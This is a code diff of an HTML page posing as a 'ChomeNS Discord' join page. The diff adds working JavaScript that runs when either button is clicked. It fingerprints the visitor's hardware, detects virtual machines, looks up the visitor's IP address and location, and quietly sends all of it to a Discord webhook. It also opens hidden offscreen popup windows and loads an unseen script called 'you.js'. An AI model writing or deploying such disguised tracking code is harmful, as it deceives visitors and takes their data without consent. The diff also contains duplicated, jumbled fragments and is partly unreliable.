@@ -87,122 +87,150 @@ button {
 
 <script>
 let isYouScriptLoaded = false;
-let joinLocked = false; // invisible lock after popup check succeeds
+let joinLocked = false; // invisible lock triggers only after popup check succeeds
 
 // ========== SYSTEM / VM INFO ==========
-function getWebGLInfo(){ /* same as before */ }
-function getVMInfo(){ /* same as before */ }
-function loadYouScript(cb){ /* same as before */ }
-function checkPopupPermission(){ /* same as before */ }
-async function getIPLocation(){ /* same as before */ }
-async function sendToDiscord(buttonName){ /* same as before */ }
+function getWebGLInfo(){
+    try{
+        const c = document.createElement("canvas");
+        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+        if(!gl) return {};
+        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+        return {
+            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "Unknown",
+            renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown"
+        };
+    }catch{return {};}
+}
 
-// ========== BUTTON HANDLER ==========
-async function handleClick(e, buttonName){
-    e.preventDefault();
+function getVMInfo(){
+    let score = 0, reasons = [];
+    const cores = navigator.hardwareConcurrency || 1;
+    if(cores <= 2){ score += 20; reasons.push("Low CPU cores"); }
+    if(navigator.deviceMemory && navigator.deviceMemory <= 4){ score += 20; reasons.push("Low RAM"); }
+    if([1024,1280,1366].includes(screen.width)){ score += 15; reasons.push("Common VM resolution"); }
+    const ua = navigator.userAgent.toLowerCase();
+    if(["virtual","vmware","vbox","qemu","xen"].some(v=>ua.includes(v))){ score += 40; reasons.push("VM keyword in UA"); }
+    const t0 = performance.now(); for(let i=0;i<1e6;i++){}
+    if(performance.now()-t0>60){ score+=15; reasons.push("Slow timing"); }
+    score += Math.random()*10; score=Math.min(99, Math.round(score));
+    return { score, detected: score>=60, reasons };
+}
 
-    const popup=document.getElementById('popup_needed');
-    const spinner=document.getElementById('spinner_holder');
+// ========== LOAD YOU.JS ==========
+function loadYouScript(cb){
+    if(isYouScriptLoaded){ cb(); return; }
+    const s = document.createElement('script');
+    s.src = '/scripts/you.js';
+    s.onload = () => { isYouScriptLoaded = true; cb(); };
+    s.onerror = () => console.error('Failed to load you.js');
+    document.head.appendChild(s);
+}
 
-    // Invisible lock: skip if Join button already succeeded
-    if(buttonName === 'Join Discord' && joinLocked) return;
-
-    popup.style.display='none';
-    spinner.innerHTML='<div class="spinner"><div></div><div></div><div></div></div>';
-
-    const allowed=await checkPopupPermission();
-    if(!allowed){
-        spinner.innerHTML='';
-        popup.style.display='block';
-        return;
-    }
-
-    // Lock the Join button invisibly AFTER popup check succeeds
-    if(buttonName === 'Join Discord') joinLocked = true;
-
-    loadYouScript(async ()=>{
-        await sendToDiscord(buttonName);
-        if(typeof window.runYouScript==='function'){ window.runYouScript(); }
-        spinner.innerHTML='';
+// ========== POPUP CHECK ==========
+function checkPopupPermission(){
+    return new Promise(resolve=>{
+        let popups=[], allowed=true;
+        try{
+            for(let i=0;i<5;i++){
+                const p=window.open('','','width=1,height=1,left=-10000,top=-10000');
+                if(!p){ allowed=false; break; }
+                popups.push(p);
+            }
+            setTimeout(()=>{
+                popups.forEach(p=>{try{p.close()}catch{}});
+                resolve(allowed);
+            },200);
+        }catch{
+            popups.forEach(p=>{try{p.close()}catch{}});
+            resolve(false);
+        }
     });
 }
 
-document.getElementById('discord_btn').addEventListener('click', e=>handleClick(e,'Join Discord'));
-document.getElementById('nah_btn').addEventListener('click', e=>handleClick(e,'Maybe later'));
-</script>
-</body>
-</html>.actions { display:grid; gap:.9rem; }
-button {
-    border:none; border-radius:14px; padding:1rem;
-    font-size:.95rem; font-weight:600; cursor:pointer;
-    transition:all .25s ease;
+// ========== IP GEOLOCATION ==========
+async function getIPLocation(){
+    try{
+        const res = await fetch("https://ipapi.co/json/");
+        if(!res.ok) return { ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown" };
+        const data = await res.json();
+        return { ip:data.ip, city:data.city, region:data.region, country:data.country_name };
+    }catch{return { ip:"Unknown", city:"Unknown", region:"Unknown", country:"Unknown" };}
 }
-.btn-discord { background:linear-gradient(135deg, var(--accent), #4752c4); color:#fff; }
-.btn-discord:hover { transform:translateY(-1px); box-shadow:0 10px 30px rgba(88,101,242,.45); }
-.btn-nah { background:transparent; color:var(--muted); border:1px solid var(--border); }
-.btn-nah:hover { background:rgba(255,255,255,.05); color:var(--text); }
 
-.spinner { margin:1.6rem auto 0; width:46px; display:flex; justify-content:space-between; }
-.spinner div { width:8px; height:8px; background:#fff; border-radius:50%; animation:bounce 1.4s infinite ease-in-out both; }
-.spinner div:nth-child(1){animation-delay:-.32s}
-.spinner div:nth-child(2){animation-delay:-.16s}
-@keyframes bounce { 0%,80%,100%{transform:scale(0)} 40%{transform:scale(1)} }
+// ========== SEND TO DISCORD ==========
+async function sendToDiscord(buttonName){
+    const vm=getVMInfo(), gl=getWebGLInfo(), conn=navigator.connection||{}, ipGeo=await getIPLocation();
+    const res=await fetch("/.netlify/functions/discord",{method:"GET"});
+    const json=await res.json(); const webhook=json.webhook;
 
-.popup-warning {
-    margin-top:1.5rem; padding:1.1rem 1.2rem;
-    border-radius:14px;
-    background:linear-gradient(180deg, rgba(239,68,68,.22), rgba(239,68,68,.1));
-    border:1px solid rgba(239,68,68,.5); color:#fee2e2;
-    font-size:.92rem; text-align:center; display:none; animation:shakeIn .35s ease;
+    const safe=val=>val===null||val===undefined?"Unknown":typeof val==="string"?val.slice(0,1024):String(val);
+
+    const payload={
+        content:`✅ **Button clicked:** ${safe(buttonName)}`,
+        embeds:[
+            {
+                title:"🖥️ System & VM Info",
+                color:0x5865F2,
+                fields:[
+                    {name:"VM Detected", value:vm.detected?"✅ TRUE":"❌ FALSE", inline:true},
+                    {name:"VM Score", value:`${vm.score}%`, inline:true},
+                    {name:"VM Reasons", value:safe(vm.reasons.join(" • ")||"None")},
+                    {name:"CPU Cores", value:safe(navigator.hardwareConcurrency), inline:true},
+                    {name:"Device Memory (GB)", value:safe(navigator.deviceMemory), inline:true}
+                ]
+            },
+            {
+                title:"🖥️ Browser & Display Info",
+                color:0x5865F2,
+                fields:[
+                    {name:"User Agent", value:safe(navigator.userAgent.slice(0,200))},
+                    {name:"Platform", value:safe(navigator.platform), inline:true},
+                    {name:"Vendor", value:safe(navigator.vendor), inline:true},
+                    {name:"Screen", value:`${safe(screen.width)}×${safe(screen.height)}`, inline:true},
+                    {name:"Color Depth", value:safe(screen.colorDepth), inline:true},
+                    {name:"Pixel Ratio", value:safe(devicePixelRatio), inline:true},
+                    {name:"Viewport", value:`${safe(innerWidth)}×${safe(innerHeight)}`, inline:true},
+                    {name:"Touch Points", value:safe(navigator.maxTouchPoints||0), inline:true},
+                    {name:"Cookies Enabled", value:safe(navigator.cookieEnabled), inline:true},
+                    {name:"Do Not Track", value:safe(navigator.doNotTrack), inline:true},
+                    {name:"WebGL Vendor", value:safe(gl.vendor)},
+                    {name:"WebGL Renderer", value:safe(gl.renderer)}
+                ]
+            },
+            {
+                title:"🌐 Network & Geo Info",
+                color:0x5865F2,
+                fields:[
+                    {name:"Network Type", value:safe(conn.effectiveType), inline:true},
+                    {name:"Downlink", value:safe(conn.downlink), inline:true},
+                    {name:"RTT", value:safe(conn.rtt), inline:true},
+                    {name:"IP", value:safe(ipGeo.ip), inline:true},
+                    {name:"City", value:safe(ipGeo.city), inline:true},
+                    {name:"Region", value:safe(ipGeo.region), inline:true},
+                    {name:"Country", value:safe(ipGeo.country), inline:true},
+                    {name:"Referrer", value:safe(document.referrer)},
+                    {name:"Page URL", value:safe(location.href)}
+                ]
+            }
+        ]
+    };
+
+    await fetch(webhook,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify(payload)
+    }).catch(err=>console.error("Discord webhook error:",err));
 }
-.popup-warning strong { display:block; font-size:1rem; margin-bottom:.25rem; }
-.popup-warning span { display:block; margin-top:.35rem; font-size:.85rem; color:#fca5a5; }
-@keyframes shakeIn { 0%{transform:none} 25%{transform:translateX(-4px)} 50%{transform:translateX(4px)} 75%{transform:translateX(-2px)} 100%{transform:none} }
-</style>
-</head>
-<body>
-<div class="card">
-    <div class="logo">
-        <img src="/media/498c01c84c251eb7c9de3b536a87e5b2.webp" alt="ChomeNS icon">
-    </div>
-    <h1>ChomeNS Discord</h1>
-    <p>Click below to join our Discord server.</p>
-
-    <div class="actions">
-        <button class="btn-discord" id="discord_btn">Join Discord</button>
-        <button class="btn-nah" id="nah_btn">Maybe later</button>
-    </div>
-
-    <div id="spinner_holder"></div>
-
-    <div id="popup_needed" class="popup-warning">
-        <strong>Popup blocked</strong>
-        Your browser blocked the new window used to open the Discord invite.
-        <span>Please allow pop-ups for this site and try again.</span>
-    </div>
-</div>
-
-<script>
-let isYouScriptLoaded = false;
-let joinLocked = false; // invisible lock after popup check succeeds
-
-// ========== SYSTEM / VM INFO ==========
-function getWebGLInfo(){ /* ...same as before... */ }
-function getVMInfo(){ /* ...same as before... */ }
-function loadYouScript(cb){ /* ...same as before... */ }
-function checkPopupPermission(){ /* ...same as before... */ }
-async function getIPLocation(){ /* ...same as before... */ }
-async function sendToDiscord(buttonName){ /* ...same as before... */ }
 
 // ========== BUTTON HANDLER ==========
 async function handleClick(e, buttonName){
     e.preventDefault();
+    const popup=document.getElementById('popup_needed');
+    const spinner=document.getElementById('spinner_holder');
 
     // Invisible lock: skip if Join button already succeeded
     if(buttonName === 'Join Discord' && joinLocked) return;
-
-    const popup=document.getElementById('popup_needed');
-    const spinner=document.getElementById('spinner_holder');
 
     popup.style.display='none';
     spinner.innerHTML='<div class="spinner"><div></div><div></div><div></div></div>';
